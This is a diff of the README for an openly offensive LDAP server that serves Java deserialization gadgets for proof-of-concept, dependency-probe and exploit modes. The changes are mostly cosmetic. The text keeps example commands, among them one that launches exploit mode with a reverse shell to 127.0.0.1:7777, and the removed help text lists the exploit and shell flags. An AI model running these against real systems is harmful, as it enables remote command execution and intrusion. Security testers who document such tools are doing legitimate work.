@@ -3,47 +3,23 @@ Logi is a ldap server focusing on ldap deserialize recon and exploit.
 
 
 - [LOGI](#logi)
-  - [Get started](#get-started)
-  - [How it work](#how-it-work)
-  - [Examples](#examples)
-  - [See also](#see-also)
+  - [✨Get started](#get-started)
+  - [⚙️How it work](#️how-it-work)
+  - [🚀Examples](#examples)
+  - [💻See also](#see-also)
 
-## Get started
+## ✨Get started
 Download logi from release.
 Use `-h` to show help.
-```
-$ ./logi -h
-Logi is a ldap server focusing on ldap deserialize recon and exploit.
+![image](image/logi.png)
 
-Usage:
-  ./logi [flags]
-
-Flags:
-MODE CONFIG:
-   -m, -mode int  1 for poc, 2 for probe, 3 for exploit
-
-SERVE CONFIG:
-   -i, -ip string    ip for binding (default "0.0.0.0")
-   -p, -port string  port for binding (default "1389")
-
-PROBE CONFIG:
-   -d, -domain string     domain for dns lookup
-   -w, -dictname string   wordlist name for probe, support: yso, jndi, mvn (default "yso")
-   -wp, -dictpath string  wordlist path for probe
-
-EXPLOIT CONFIG:
-   -g, -gadget string   gadget for exploit, support: cb1v18, cb1v19
-   -c, -command string  command for exploit
-   -s, -shell string    reverse shell, e.g. 127.0.0.1:7777
-```
-
-## How it work
+## ⚙️How it work
 Logi hosts a ldap service, waiting for ldap lookup
-- poc mode: reply a urldns gadget points to `domain` for deserialize 
+- poc mode: reply a urldns gadget points to `domain` for deserialize verify
 - probe mode: reply different probe gadgets points to `probename.domain` in turn for dependency probe
 - exploit mode: reply a gadget for command execute
 
-## Examples
+## 🚀Examples
 Run poc mode with dns domain `dnslog.me`.
 You need to send a ldap lookup to logi.
 ```
@@ -67,7 +43,7 @@ Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`
 ```
 ./logi -m 3 -g cb1v18 -s '127.0.0.1:7777'
 ```
-## See also
+## 💻See also
 [GadgetProbe](https://github.com/BishopFox/GadgetProbe)
 
 [JNDI-Inject-Exploit](https://github.com/exp1orer/JNDI-Inject-Exploit)
